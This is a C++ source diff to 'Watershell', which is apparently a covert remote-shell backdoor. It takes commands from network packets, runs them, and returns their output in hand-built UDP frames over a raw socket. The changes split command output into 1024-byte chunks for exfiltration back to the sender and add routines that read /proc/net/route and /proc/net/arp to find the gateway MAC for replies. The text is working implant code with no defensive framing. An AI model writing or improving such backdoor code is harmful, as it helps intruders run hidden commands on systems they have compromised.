@@ -83,6 +83,10 @@ Watershell::Watershell(int port, bool DEBUG, bool PROMISC) {
       if (this->DEBUG) std::perror("setsockopt");
 }
 
+void Watershell::Init(){
+  this->SetGatewayMAC();
+}
+
 int Watershell::RunOnce() {
   int n;
   unsigned char buf[2048];
@@ -133,7 +137,57 @@ int Watershell::RunOnce() {
       }
 
       pclose(fd);
-      this->SendReply(buf, comout);
+      int i = 0;
+      std::string cmdOutStr(reinterpret_cast<char*>((comout)));
+      std::string chunk;
+      while (i < cmdOutStr.size()){
+        int offset =  (i+1024) < cmdOutStr.size() ? 1024 : cmdOutStr.size()-i;
+        chunk = cmdOutStr.substr(i, offset);
+        this->SendReply(buf, chunk.c_str());
+        i += 1024;
+      }
+  }
+}
+
+std::string Watershell::GetMacFromIP(char *ip_addr){
+  std::ifstream arp_file("/proc/net/arp", std::ifstream::in);
+  std::regex mac_regex(std::string("^") + ip_addr + std::string("\\s*\\w*\\s*\\w*\\s*([\\w:]*)"));
+
+  // skip first line
+  arp_file.ignore ( std::numeric_limits<std::streamsize>::max(), '\n' );
+  std::string line;
+  while(getline( arp_file, line )){
+    std::smatch mac_match;
+    if(std::regex_search(line, mac_match, mac_regex)) {
+      return mac_match[1];
+    }
+  }
+}
+
+void Watershell::SetGatewayMAC(){
+  std::ifstream route_file("/proc/net/route", std::ifstream::in);
+  std::regex route_regex(std::string("^") + this->iface + std::string("\\s*00000000\\s*([A-Z0-9]{8})"));
+  // skip first line
+  route_file.ignore ( std::numeric_limits<std::streamsize>::max(), '\n' );
+  std::string line;
+  while(getline( route_file, line )){
+    std::smatch route_match;
+    if(std::regex_search(line, route_match, route_regex)) {
+      unsigned int ip;
+      std::stringstream ss;
+      ss << std::hex << route_match[1];
+      ss >> ip;
+      struct in_addr addr;
+      addr.s_addr = htonl(ip);
+      /* Reverse the bytes in the binary address */
+      addr.s_addr =
+        ((addr.s_addr & 0xff000000) >> 24) |
+        ((addr.s_addr & 0x00ff0000) >>  8) |
+        ((addr.s_addr & 0x0000ff00) <<  8) |
+        ((addr.s_addr & 0x000000ff) << 24);
+      char *ip_addr = inet_ntoa(addr);
+      this->gateway_mac = this->GetMacFromIP(ip_addr);
+    }
   }
 }
 
@@ -185,7 +239,7 @@ void Watershell::GetInterfaceName(char iface[]){
   close(sock);
 }
 
-void Watershell::SendReply(unsigned char *buf, unsigned char *payload){
+void Watershell::SendReply(unsigned char *buf, const char *payload){
   struct udpframe frame;
   struct sockaddr_ll saddrll;
   struct sockaddr_in sin;
@@ -225,6 +279,7 @@ void Watershell::SendReply(unsigned char *buf, unsigned char *payload){
   frame.ip.protocol = IPPROTO_UDP;
 
   //layer 4
+
   frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
   frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
   frame.udp.len = htons(strlen((char *)payload) + sizeof(frame.udp));
